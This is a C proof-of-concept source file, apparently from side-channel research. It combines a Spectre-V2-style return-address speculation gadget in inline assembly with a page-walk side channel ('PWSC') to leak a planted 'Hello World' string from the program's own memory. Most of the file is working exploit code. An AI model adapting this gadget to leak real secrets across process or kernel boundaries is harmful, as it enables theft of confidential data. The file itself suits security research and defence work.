#include "pwsc.h"
#include "mapping.h"
#include "util.h"
#include "leak.h"
#include <string.h> 
#include <time.h>

// TODO need to credit where I got this gadget orginally from 
__attribute__((noinline))
static void unmasked_gadget(void *secret_ptr, uint64_t mask) {
	asm volatile (
		"call overwrite_arch_return_addr\n\t"
		"spec_return:\n\t"
			"movq (%0), %%rax\n\t"		// secret = *secret_ptr
			"and %%rbx, %%rax\n\n"		// mask(secret)
			"movb (%%rax), %%al\n\t"	// *secret
		"infinite_loop:\n\t"
			"pause\n\t"
			"jmp infinite_loop\n\t"
		"overwrite_arch_return_addr:\n\t"
			"movq $arch_return, (%%rsp)\n\t"
			"clflush (%%rsp)\n\t"
			"cpuid\n\t"
			"movq %1, %%rbx\n\t"
			"ret\n\t"
		"arch_return:\n\t"
		:
		: "r" (secret_ptr), "r" (mask)
		: "%rax", "%rbx", "%rcx", "%rdx"
	);
}

// This function will be called by PWSC to setup the trigger statement
uint64_t setup_trigger(uint64_t target, uint64_t phase, uint64_t __trash) {
    // Nothing is needed here
    // You can also trigger the unmasked_gdaget here to "warm up" everything
    // neede dby the actual trigger function
    (void) target; 
    (void) phase;
    return __trash;
}

// This function will be called by PWSC to trigger the secret-dependent page walk
// It is important to use the phase variable (0 is for noise measurement, 1 is for signal measurement)
uint64_t trigger(uint64_t target, uint64_t phase, uint64_t __trash) {
    unmasked_gadget((void *)(target * phase), ~0x7fff000000000000); // LAM mask for userspace 
    return __trash; 
}

int main(void) {
    // Pin to CPU 5
	pin_cpu(5);
    srand(time(0)); 

    // Init PWSC
    fprintf(stderr, "Testing ASCII Spectre-V2 + PWSC Leakage!\n"); 
    pwsc_init_reset(setup_trigger, NULL, trigger, MEMORY_MAP_ORDER_ORACLE_EVICT_SIZES, THRESHOLD_FAST, NUM_TRIALS_FAST); 

    // Secret 
    char *target = "Hello World! You successfully leaked this! :D";

    // Update noise filter to mask out secret's address
    uint64_t init_noise_filter[64] = {0};
    init_noise_filter[VPN4_TO_CACHE_LINE(target)] += 2;
    init_noise_filter[VPN3_TO_CACHE_LINE(target)] += 2;
    init_noise_filter[VPN2_TO_CACHE_LINE(target)] += 2;
    init_noise_filter[VPN1_TO_CACHE_LINE(target)] += 2;
    init_noise_filter[PO_TO_CACHE_LINE(target)] += 2;

    // Leak the secret using Spectre-V2 gadget! 
    // Enable ascii_flag
    // The -5 is to account for the endian conversion, we leak starting the MSBs so we leak "earlier" characters first.
    struct bit_map *map = 
        leak_addr_range((uint64_t)target - 5, (uint64_t)target + strlen(target) - 5, 
                        1 /* Gran */, init_noise_filter, 1 /* ASCII flag */);
    if(!map) {
        fprintf(stderr, "Map is null something went wrong :(\n");
        exit(1);
    }
    
    // Output extracted string
    extract_string(map);

    // Clean up
    destroy_bit_map(map);
    return 0; 
}